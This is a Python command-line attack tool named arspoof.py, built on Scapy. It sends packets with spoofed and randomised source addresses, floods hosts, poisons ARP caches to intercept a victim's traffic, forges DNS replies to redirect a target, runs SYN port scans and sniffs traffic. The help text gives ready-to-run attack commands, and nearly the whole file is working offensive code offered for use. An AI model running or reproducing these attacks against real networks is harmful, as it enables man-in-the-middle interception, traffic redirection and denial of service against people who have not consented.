#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
arspoof.py - CLI-based network spoofing and packet injection tool (Windows compatible, no admin required)
Usage: python arspoof.py <command> [parameters]
Npcap must be installed.
"""

import os
import sys
import time
import random
import argparse
import platform
from datetime import datetime

try:
    from scapy.all import (
        sniff, IP, TCP, UDP, ICMP, Raw, send, sendp, ARP, Ether,
        get_if_list, get_if_hwaddr, sr1, DNS, DNSRR, conf
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

IS_WINDOWS = platform.system() == "Windows"

def enable_ansi():
    if IS_WINDOWS:
        os.system("")

def parse_payload(text, is_hex):
    if is_hex:
        cleaned = text.replace(" ", "").replace("\\x", "")
        try:
            return bytes.fromhex(cleaned)
        except ValueError:
            return text.encode("utf-8", errors="ignore")
    return text.encode("utf-8")

def log(msg, level="info"):
    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    colors = {
        "info": "\033[92m", "warn": "\033[93m", "error": "\033[91m",
        "success": "\033[96m", "reset": "\033[0m",
    }
    enable_ansi()
    c = colors.get(level, colors["info"])
    print(f"[{ts}] {c}{msg}{colors['reset']}")

def pick_iface(name):
    return name if name else None

def show_credits():
    enable_ansi()
    R = "\033[0m"
    B = "\033[1m"
    colors = [
        "\033[91m", "\033[93m", "\033[92m", "\033[96m",
        "\033[94m", "\033[95m", "\033[97m"
    ]
    text = "My Instagram And TikTok:@arasswys"
    line = ""
    for i, ch in enumerate(text):
        line += colors[i % len(colors)] + B + ch
    line += R
    print()
    print(line)
    print()

def cmd_ifaces(args):
    if not SCAPY_OK:
        log("Scapy is not installed. Run 'pip install scapy'.", "error"); return
    log("Available interfaces:", "success")
    for i, name in enumerate(get_if_list()):
        try:
            mac = get_if_hwaddr(name)
        except Exception:
            mac = "Unknown"
        print(f"  [{i}] {name}  MAC: {mac}")
    try:
        print(f"\nDefault interface: {conf.iface}")
    except Exception:
        pass

def cmd_ip(args):
    if not SCAPY_OK:
        log("Scapy is not installed.", "error"); return

    proto = args.proto.upper()
    dst_port = args.port
    ttl = args.ttl
    payload = parse_payload(args.payload, args.hex)
    iface = pick_iface(args.iface)
    interval = args.interval / 1000.0

    if args.random:
        log("Random source IP mode enabled.", "warn")

    start_time = time.time()
    sent = 0
    rtt_list = []

    for i in range(1, args.count + 1):
        src_ip = args.src
        if args.random:
            src_ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

        ip_layer = IP(src=src_ip, dst=args.dst, ttl=ttl)

        if proto == "ICMP":
            pkt = ip_layer / ICMP() / Raw(load=payload)
        elif proto == "UDP":
            pkt = ip_layer / UDP(sport=random.randint(1024, 65535), dport=dst_port) / Raw(load=payload)
        elif proto == "TCP":
            pkt = ip_layer / TCP(sport=random.randint(1024, 65535), dport=dst_port, flags=args.flags) / Raw(load=payload)
        else:
            log(f"Unknown protocol: {proto}", "error"); return

        t0 = time.time()
        try:
            if iface:
                send(pkt, iface=iface, verbose=False)
            else:
                send(pkt, verbose=False)
            sent += 1
            elapsed_ms = (time.time() - t0) * 1000
            rtt_list.append(elapsed_ms)
            log(f"Packet {i}/{args.count}: {src_ip} -> {args.dst} ({proto}) [{elapsed_ms:.2f} ms]", "success")
        except Exception as e:
            log(f"Send error: {e}", "error")

        if i < args.count and interval > 0:
            time.sleep(interval)

    total_time = (time.time() - start_time) * 1000
    avg = sum(rtt_list) / len(rtt_list) if rtt_list else 0.0
    mn = min(rtt_list) if rtt_list else 0.0
    mx = max(rtt_list) if rtt_list else 0.0
    log(f"--- Summary: {sent}/{args.count} sent | total {total_time:.2f} ms | avg {avg:.2f} ms | min {mn:.2f} ms | max {mx:.2f} ms | interval {args.interval:.1f} ms ---", "info")

def cmd_arp(args):
    if not SCAPY_OK:
        log("Scapy is not installed.", "error"); return

    iface = pick_iface(args.iface) or conf.iface
    try:
        my_mac = get_if_hwaddr(iface)
    except Exception:
        my_mac = "ff:ff:ff:ff:ff:ff"

    interval = args.interval / 1000.0
    log(f"ARP poisoning started: Target={args.target} Fake GW={args.gateway} ({args.count} packets, {args.interval:.1f} ms)", "warn")

    for i in range(1, args.count + 1):
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(
            op=2, pdst=args.target, hwdst="ff:ff:ff:ff:ff:ff",
            psrc=args.gateway, hwsrc=my_mac
        )
        try:
            sendp(pkt, iface=iface, verbose=False)
            log(f"ARP packet {i}/{args.count} sent: {args.gateway} -> {args.target}", "success")
        except Exception as e:
            log(f"ARP error: {e}", "error")
        if i < args.count and interval > 0:
            time.sleep(interval)

def cmd_dns(args):
    if not SCAPY_OK:
        log("Scapy is not installed.", "error"); return

    iface = pick_iface(args.iface)
    log(f"DNS spoof listening started: target={args.target} fake_ip={args.fake_ip}", "warn")

    def handle(pkt):
        try:
            if DNS in pkt and pkt[DNS].qr == 0 and IP in pkt and pkt[IP].src == args.target:
                if pkt[DNS].qd:
                    qname = pkt[DNS].qd.qname
                    qid = pkt[DNS].id
                    spoofed = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
                              UDP(sport=53, dport=pkt[UDP].sport) / \
                              DNS(id=qid, qr=1, aa=1, qd=pkt[DNS].qd,
                                  an=DNSRR(rrname=qname, rdata=args.fake_ip))
                    send(spoofed, iface=iface, verbose=False)
                    log(f"[DNS] {pkt[IP].src} -> {qname.decode(errors='ignore')} fake: {args.fake_ip}", "success")
        except Exception as e:
            log(f"DNS spoof error: {e}", "error")

    try:
        sniff(iface=iface, prn=handle, store=False)
    except KeyboardInterrupt:
        log("DNS spoof stopped.", "warn")

def cmd_scan(args):
    if not SCAPY_OK:
        log("Scapy is not installed.", "error"); return

    ports = []
    try:
        for p in args.ports.split(","):
            if "-" in p:
                a, b = map(int, p.split("-")); ports.extend(range(a, b + 1))
            else:
                ports.append(int(p))
    except Exception:
        log("Invalid port format. Example: 21,22,80,443 or 20-100", "error"); return

    interval = args.interval / 1000.0
    log(f"Port scan: {args.target} ({len(ports)} ports, {args.interval:.1f} ms interval)", "warn")
    for port in ports:
        pkt = IP(dst=args.target)/TCP(dport=port, flags="S")
        try:
            resp = sr1(pkt, timeout=args.timeout, verbose=False)
            if resp and resp.haslayer(TCP) and resp[TCP].flags == 0x12:
                log(f"Port {port} OPEN (SYN-ACK)", "success")
            elif resp and resp.haslayer(TCP) and resp[TCP].flags == 0x14:
                log(f"Port {port} CLOSED (RST)", "info")
        except Exception as e:
            log(f"Port {port} error: {e}", "error")
        if interval > 0:
            time.sleep(interval)

def cmd_sniff(args):
    if not SCAPY_OK:
        log("Scapy is not installed.", "error"); return

    iface = pick_iface(args.iface)
    filt = args.filter if args.filter else None
    log(f"Live capture started: iface={iface or 'default'} filter={filt or 'none'}", "warn")

    def handle(pkt):
        try:
            if IP in pkt:
                src, dst = pkt[IP].src, pkt[IP].dst
                if TCP in pkt:
                    proto = "TCP"; info = f"{pkt[TCP].sport}->{pkt[TCP].dport} [{pkt[TCP].flags}]"
                elif UDP in pkt:
                    proto = "UDP"; info = f"{pkt[UDP].sport}->{pkt[UDP].dport}"
                elif ICMP in pkt:
                    proto = "ICMP"; info = f"type={pkt[ICMP].type} code={pkt[ICMP].code}"
                else:
                    proto = "IP"; info = ""
                if DNS in pkt and pkt[DNS].qd:
                    proto = "DNS"
                    try:
                        info = f"query={pkt[DNS].qd.qname.decode(errors='ignore')}"
                    except Exception:
                        pass
                log(f"{src} -> {dst} [{proto}] {info} (len={len(pkt)})", "info")
            elif ARP in pkt:
                log(f"ARP op={pkt[ARP].op} {pkt[ARP].psrc} -> {pkt[ARP].pdst}", "info")
        except Exception:
            pass

    try:
        sniff(iface=iface, prn=handle, store=False, filter=filt)
    except KeyboardInterrupt:
        log("Capture stopped.", "warn")

EPILOG = """
examples:
  List interfaces:
    python arspoof.py ifaces

  Show credits banner:
    python arspoof.py -cr

  Send 10 spoofed ICMP packets with 500 ms interval and custom payload:
    python arspoof.py ip -s 244.0.0.1 -d 192.168.1.1 -p icmp -c 10 --interval 500 --payload "hacked by greynet!"

  Ping-like fast flood (no interval):
    python arspoof.py ip -s 244.0.0.1 -d 192.168.1.1 -p icmp -c 100 --interval 0

  Send spoofed TCP SYN to port 80 every 1000 ms:
    python arspoof.py ip -s 10.0.0.99 -d 192.168.1.1 -p tcp --port 80 --flags S -c 5 --interval 1000

  Send spoofed UDP with hex payload:
    python arspoof.py ip -s 10.0.0.99 -d 192.168.1.1 -p udp --port 53 --payload "deadbeef" --hex

  Random source IP flood (10 packets, 200 ms interval):
    python arspoof.py ip -d 192.168.1.1 -p icmp --random -c 10 --interval 200

  ARP poison target 192.168.1.50 pretending to be gateway 192.168.1.1 (1000 ms interval):
    python arspoof.py arp -t 192.168.1.50 -g 192.168.1.1 -c 100 --interval 1000

  DNS spoof target 192.168.1.24 redirecting to 192.168.1.12:
    python arspoof.py dns -t 192.168.1.24 -f 192.168.1.12

  Scan ports 21,22,80,443 on target with 300 ms between probes:
    python arspoof.py scan -t 192.168.1.1 -p 21,22,80,443 --interval 300

  Capture live ICMP traffic:
    python arspoof.py sniff -f "icmp"
"""

def build_parser():
    p = argparse.ArgumentParser(
        prog="arspoof.py",
        description="arspoof CLI - hping3-like network spoofing and packet injection tool (Windows compatible, no admin required)",
        epilog=EPILOG,
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    p.add_argument("-cr", "--credits", action="store_true", help="Show colored credits banner and exit")
    sub = p.add_subparsers(dest="cmd", required=False, metavar="<command>")

    sp = sub.add_parser(
        "ifaces",
        help="List all available network interfaces with MAC addresses",
        description="Lists all network interfaces detected by Scapy/Npcap, including their MAC addresses and the current default interface."
    )
    sp.set_defaults(func=cmd_ifaces)

    sp = sub.add_parser(
        "ip",
        help="Send spoofed IP packets (ICMP/TCP/UDP) with custom source IP, TTL, payload and interval",
        description="Crafts and sends raw IP packets with a spoofed source address. Supports ICMP echo, TCP (with flags) and UDP. Payload can be plain text or HEX. Interval in milliseconds controls the delay between packets (like ping).",
        epilog="example: python arspoof.py ip -s 244.0.0.1 -d 192.168.1.1 -p icmp -c 10 --interval 500 --payload \"hacked by greynet!\"",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    sp.add_argument("-s", "--src", default="10.0.0.99", help="Source IP address to spoof (default: 10.0.0.99)")
    sp.add_argument("-d", "--dst", required=True, help="Destination IP address (required)")
    sp.add_argument("-p", "--proto", default="ICMP", choices=["ICMP", "TCP", "UDP", "icmp", "tcp", "udp"], help="Protocol: ICMP, TCP or UDP (default: ICMP)")
    sp.add_argument("--port", type=int, default=80, help="Destination port for TCP/UDP (default: 80)")
    sp.add_argument("--ttl", type=int, default=64, help="IP TTL value (default: 64)")
    sp.add_argument("--payload", default="test-payload", help="Payload data as text (default: test-payload)")
    sp.add_argument("--hex", action="store_true", help="Interpret payload as HEX string instead of plain text")
    sp.add_argument("--random", action="store_true", help="Use a random source IP for every packet instead of --src")
    sp.add_argument("-c", "--count", type=int, default=1, help="Number of packets to send (default: 1)")
    sp.add_argument("--interval", type=float, default=1000.0, help="Interval between packets in MILLISECONDS, like ping (default: 1000 = 1 s). 0 = no delay")
    sp.add_argument("--delay", type=float, default=None, help="Deprecated alias for --interval given in SECONDS (use --interval instead)")
    sp.add_argument("-i", "--iface", default=None, help="Network interface name (default: auto-select)")
    sp.add_argument("--flags", default="S", help="TCP flags to set, e.g. S, A, SA, F, R (default: S)")
    sp.set_defaults(func=cmd_ip)

    sp = sub.add_parser(
        "arp",
        help="Perform ARP poisoning (spoof gateway MAC to target) with configurable interval",
        description="Sends forged ARP replies to a target host, telling it that the gateway IP belongs to your MAC address. This redirects the target's traffic through your machine (MITM). Interval in milliseconds.",
        epilog="example: python arspoof.py arp -t 192.168.1.50 -g 192.168.1.1 -c 100 --interval 1000",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    sp.add_argument("-t", "--target", required=True, help="Target (victim) IP address to poison (required)")
    sp.add_argument("-g", "--gateway", required=True, help="IP address to impersonate, usually the gateway (required)")
    sp.add_argument("-c", "--count", type=int, default=100, help="Number of ARP packets to send (default: 100)")
    sp.add_argument("--interval", type=float, default=500.0, help="Interval between packets in MILLISECONDS (default: 500)")
    sp.add_argument("--delay", type=float, default=None, help="Deprecated alias for --interval given in SECONDS")
    sp.add_argument("-i", "--iface", default=None, help="Network interface name (default: auto-select)")
    sp.set_defaults(func=cmd_arp)

    sp = sub.add_parser(
        "dns",
        help="Perform DNS spoofing by sniffing queries and sending forged replies",
        description="Listens for DNS queries from the target IP and replies with a forged answer pointing to the fake IP address. Requires ongoing sniffing; runs until Ctrl+C.",
        epilog="example: python arspoof.py dns -t 192.168.1.24 -f 192.168.1.12",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    sp.add_argument("-t", "--target", required=True, help="Target (victim) IP whose DNS queries will be intercepted (required)")
    sp.add_argument("-f", "--fake-ip", dest="fake_ip", required=True, help="Fake IP address to return in spoofed DNS replies (required)")
    sp.add_argument("-i", "--iface", default=None, help="Network interface name (default: auto-select)")
    sp.set_defaults(func=cmd_dns)

    sp = sub.add_parser(
        "scan",
        help="TCP SYN port scanner with configurable inter-probe interval",
        description="Performs a TCP SYN scan against a target IP over the given port list/range. Reports OPEN (SYN-ACK) and CLOSED (RST) ports. Interval in milliseconds between probes.",
        epilog="example: python arspoof.py scan -t 192.168.1.1 -p 21,22,80,443 --interval 300",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    sp.add_argument("-t", "--target", required=True, help="Target IP address to scan (required)")
    sp.add_argument("-p", "--ports", required=True, help="Port list or range, e.g. 21,22,80,443 or 1-1024 (required)")
    sp.add_argument("--timeout", type=float, default=0.5, help="Timeout per port in seconds (default: 0.5)")
    sp.add_argument("--interval", type=float, default=0.0, help="Interval between probes in MILLISECONDS (default: 0)")
    sp.add_argument("-i", "--iface", default=None, help="Network interface name (default: auto-select)")
    sp.set_defaults(func=cmd_scan)

    sp = sub.add_parser(
        "sniff",
        help="Live packet capture with optional BPF filter",
        description="Captures live network packets and prints a one-line summary per packet. Supports BPF filters like 'icmp', 'tcp port 80', 'udp and host 192.168.1.1'. Runs until Ctrl+C.",
        epilog="example: python arspoof.py sniff -f \"tcp port 80\"",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    sp.add_argument("-i", "--iface", default=None, help="Network interface name (default: auto-select)")
    sp.add_argument("-f", "--filter", default=None, help="BPF capture filter, e.g. 'icmp', 'tcp port 80', 'udp and host 1.2.3.4' (default: none)")
    sp.set_defaults(func=cmd_sniff)

    return p

def _normalize_interval(args):
    if getattr(args, "delay", None) is not None:
        args.interval = args.delay * 1000.0
    return args

def main():
    parser = build_parser()

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(0)

    args = parser.parse_args()

    if getattr(args, "credits", False):
        show_credits()
        sys.exit(0)

    if not SCAPY_OK:
        print("ERROR: Scapy is not installed. Run 'pip install scapy'.")
        sys.exit(1)

    if not hasattr(args, "func"):
        parser.print_help()
        sys.exit(0)

    args = _normalize_interval(args)

    try:
        args.func(args)
    except KeyboardInterrupt:
        log("Interrupted by user.", "warn")
    except Exception as e:
        log(f"Unexpected error: {e}", "error")

if __name__ == "__main__":
    main()